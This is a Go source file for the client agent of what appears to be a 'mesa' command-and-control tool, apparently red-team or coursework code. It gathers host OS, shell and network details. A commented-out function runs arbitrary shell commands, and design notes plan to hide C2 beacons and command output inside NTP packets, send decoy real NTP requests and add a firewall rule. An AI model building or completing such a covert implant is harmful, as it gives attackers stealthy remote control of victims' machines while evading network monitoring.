package main

import (
	//"fmt"
	"os"
	//"os/exec"
	//"strings"
	//"bytes"
	//"log"

	//"mesa/client/pkg/ntppacket"
	//"mesa/client/pkg/listener"
	"mesa/client/pkg/agent"

	//"github.com/google/gopacket"
	//"github.com/google/gopacket/pcap"
)

var newAgent agent.Agent

func init(){
    newAgent = agent.Agent{}
	newAgent.OpSys, newAgent.ShellType, newAgent.ShellFlag = agent.DetectOS()
	newAgent.IFace = agent.GetNetAdapter()
	newAgent.ServerIP = agent.GetServerIP()
	newAgent.MyIP = agent.GetMyIP()
}

func main() {
	//NTP server ip passed as an argument when building?
	
	for { //program runs until break
		os.Exit(0)
	}
	

	
		
}
/*

func runCMD(command string, agent Agent) {
	var startType string
	var flag string

	if agent.OpSys == "windows"{
		startType = "cmd"
		flag = "/c"
	} else {
		startType = "/bin/sh"
		flag = "-c"
	}

	output, err := exec.Command(startType, flag, command).Output()
	if err != nil{
		fmt.Println("couldn't run command")
	}

	fmt.Println(string(output))
}



raw sockets

recieve beacon, see ping/comd id
parse/decode bytes into readable
->run commmand
->get output
->encode output
->send output back to c2
->make it so NTP packet isn't actually read in
-> send actual NTP request for time

->see ping
->resync request
->receive actual time info from NTP server



client also must check to see if the time service is running


TODO agent is compiled for specific os, sends initial ping



//TODO add firewall command rule in setup
*/